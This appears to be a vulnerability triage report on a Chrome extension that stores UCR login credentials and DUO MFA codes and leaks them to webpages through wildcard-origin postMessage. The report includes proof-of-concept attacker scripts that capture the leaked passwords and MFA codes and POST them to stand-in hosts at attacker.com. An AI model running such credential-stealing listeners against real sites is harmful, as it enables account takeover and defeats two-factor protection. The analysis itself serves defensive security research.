# CoCo Analysis: oddbinhopeegfapdcgdgpbdcacoekbpa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (4 unique patterns, detected from both storage.sync and storage.local)

---

## Sink 1: storage_sync_get_source → window_postMessage_sink (username/password leak)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oddbinhopeegfapdcgdgpbdcacoekbpa/opgen_generated_files/cs_1.js
Line 479	    if (data.username != "unknown"){
	data.username
Line 480	        window.postMessage({"username": data.username, "password": data.password}, "*");
	data.password

**Code:**

```javascript
// Content script (cs_1.js, login.js)
function sendCredentials(data){
    if (data.username != "unknown"){
        window.postMessage({"username": data.username, "password": data.password}, "*"); // ← leaks to webpage
        chrome.storage.local.set({lastLogin: Date.now()});
    }
}

setTimeout( function(){
    chrome.storage.local.get({synced: false, initial: false, autologin: false, lastLogin: 0}, function(data){
        if (data.synced){
            // passcode synced
            if (data.initial && Date.now() - data.lastLogin > 1000){
                chrome.storage.sync.get({username: 'unknown', password: 'unknown'}, sendCredentials); // ← reads from storage
            }else if (Date.now() - data.lastLogin > 1000){
                chrome.storage.sync.get({autologin: false}, function(data){
                    if (data.autologin){
                        chrome.storage.sync.get({username: 'unknown', password: 'unknown'}, sendCredentials); // ← reads from storage
                    }
                });
            }
        }
    });
}, ...);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Information disclosure via window.postMessage

**Attack:**

```javascript
// Attacker webpage at https://auth.ucr.edu/cas/login?service=*
// (per manifest, content script runs on this pattern)

// Listen for credentials leaked by extension
window.addEventListener("message", function(event) {
  if (event.data.username && event.data.password) {
    console.log("Stolen credentials:", event.data);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify({
        username: event.data.username,
        password: event.data.password
      })
    });
  }
});

// Wait for extension to automatically send credentials
// The extension sends credentials via postMessage when:
// 1. User has synced passcodes (data.synced == true)
// 2. Initial login (data.initial == true) OR autologin enabled
// 3. Last login was > 1 second ago
```

**Impact:** Complete information disclosure of stored UCR login credentials (username and password). The extension automatically leaks user credentials to any webpage matching the content script pattern via window.postMessage with wildcard origin ("*"), allowing credential theft.

---

## Sink 2: storage_local_get_source → window_postMessage_sink (username/password leak)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oddbinhopeegfapdcgdgpbdcacoekbpa/opgen_generated_files/cs_1.js
(Same code as Sink 1)

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, but CoCo detected it from both storage.sync.get and storage.local.get paths. Both lead to the same credential leak via postMessage.

---

## Sink 3: storage_sync_get_source → window_postMessage_sink (MFA keys leak)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oddbinhopeegfapdcgdgpbdcacoekbpa/opgen_generated_files/cs_0.js
Line 483	        if(items.keys.length < 3 && !items.initial){
	items.keys
Line 486	        window.postMessage({"keys": items.keys.pop()})
	items.keys.pop()

**Code:**

```javascript
// Content script (cs_0.js, handler.js for DUO MFA)
window.addEventListener("message", function(e){
    var cb = function(items){
        if (items.autopush) {
            window.postMessage({'push': true});
            return;
        }
        if(items.keys.length < 3 && !items.initial){
                chrome.runtime.sendMessage('GetCodes');
        }
        window.postMessage({"keys": items.keys.pop()}) // ← leaks MFA keys to webpage
        if (items.isCurrentSynced){
            chrome.storage.sync.set({keys: items.keys}, null);
        }else{
            chrome.storage.local.set({keys: items.keys}, null);
        }
    };
    if (e.data.retrieve === 'code'){
        chrome.storage.local.get({synced: false}, function(data){
            if (data.synced){
                chrome.storage.sync.get({keys: [], initial: false, isCurrentSynced: true, autopush: false}, cb); // ← reads MFA keys
            }else{
                chrome.storage.local.get({keys: [], initial: false, isCurrentSynced: false, autopush: false}, cb); // ← reads MFA keys
            }
        })
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Information disclosure via window.postMessage

**Attack:**

```javascript
// Attacker webpage at https://api-24ed243a.duosecurity.com/frame/prompt*
// (per manifest, content script runs on this pattern)

// Trigger MFA key disclosure
window.postMessage({retrieve: 'code'}, "*");

// Listen for leaked MFA keys
window.addEventListener("message", function(event) {
  if (event.data.keys) {
    console.log("Stolen MFA key:", event.data.keys);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect-mfa", {
      method: "POST",
      body: JSON.stringify({mfa_key: event.data.keys})
    });
  }
});
```

**Impact:** Complete compromise of two-factor authentication. Attacker can steal stored DUO MFA passcodes by sending a postMessage trigger and receiving the MFA keys back via postMessage with wildcard origin, completely bypassing the user's MFA protection.

---

## Sink 4: storage_local_get_source → window_postMessage_sink (MFA keys leak)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oddbinhopeegfapdcgdgpbdcacoekbpa/opgen_generated_files/cs_0.js
(Same code as Sink 3)

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 3, but CoCo detected it from both storage.sync.get and storage.local.get paths. Both lead to the same MFA key leak via postMessage.
